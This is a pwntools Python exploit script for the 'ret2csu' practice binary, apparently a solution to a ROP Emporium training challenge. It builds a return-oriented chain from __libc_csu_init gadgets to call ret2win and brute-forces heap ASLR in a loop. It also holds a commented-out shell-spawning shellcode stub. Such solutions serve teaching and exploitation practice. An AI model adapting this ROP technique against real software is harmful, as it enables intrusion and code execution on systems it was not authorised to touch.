#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
exe = './ret2csu'


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *main
break *__libc_csu_init+64
break *__libc_csu_init+90
break *pwnme
break *ret2win
break *ret2win+14
#Set system_command
break *ret2win+32
break *ret2win+66
break *ret2win+77
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

elf = ELF(exe)
rop = ROP(elf)

#payload = cyclic(100)
ret2win = elf.sym.ret2win
ret2win_ptr = 0xc032c8 #random heap address
junk = 0xdeadcafebabebeef


"""
0x000000000040089a <+90>:    pop    rbx
0x000000000040089b <+91>:    pop    rbp
0x000000000040089c <+92>:    pop    r12
0x000000000040089e <+94>:    pop    r13
0x00000000004008a0 <+96>:    pop    r14
0x00000000004008a2 <+98>:    pop    r15
0x00000000004008a4 <+100>:   ret
"""

lib_csu_gadget1 = 0x000000000040089a

"""
0x0000000000400880 <+64>:    mov    rdx,r15
0x0000000000400883 <+67>:    mov    rsi,r14
0x0000000000400886 <+70>:    mov    edi,r13d
0x0000000000400889 <+73>:    call   QWORD PTR [r12+rbx*8]
"""

lib_csu_gadget2 = 0x0000000000400880

rop.raw(p64(lib_csu_gadget1))
rop.raw(p64(0x0)) #rbx
rop.raw(p64(junk)) #rbp
rop.raw(p64(ret2win_ptr)) #r12
rop.raw(p64(junk)) #r13
rop.raw(p64(junk)) #r14
rop.raw(p64(junk))

rop.raw(p64(lib_csu_gadget2))

rop.raw(ret2win)
payload = fit({40:rop.chain()})

#bruteforce heap ASLR

while True:
    io = start()

    print(io.recv())
    io.sendline(payload)

    try:
        print(io.recv())
        break
    except:
        io.kill()


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

    #io.interactive()

